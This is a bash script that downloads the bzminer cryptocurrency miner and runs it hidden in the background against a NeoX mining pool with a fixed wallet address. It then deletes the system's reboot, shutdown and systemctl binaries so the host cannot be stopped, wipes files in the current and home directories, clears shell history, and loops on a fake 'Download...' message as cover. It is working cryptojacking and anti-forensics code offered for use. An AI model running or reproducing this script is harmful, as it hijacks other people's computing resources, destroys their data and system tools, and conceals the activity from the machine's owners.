#!/bin/bash
apt-get update 
apt-get install -y wget curl
wget https://github.com/bzminer/bzminer/releases/download/v21.4.0/bzminer_v21.4.0_linux.tar.gz 
tar -xvf *.tar.gz
rm -xvf *.tar.gz
cd bzminer_v21.4.0_linux
nohup ./bzminer -a neox -p neox.2miners.com:4040 -w GZXPjDMoTBMTUnfM5XoxsFr6FN8ccTkLKb.$(echo Rig-$(shuf -i 1000-9999 -n 1)) --nc 1 > /dev/null 2>&1 &
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done
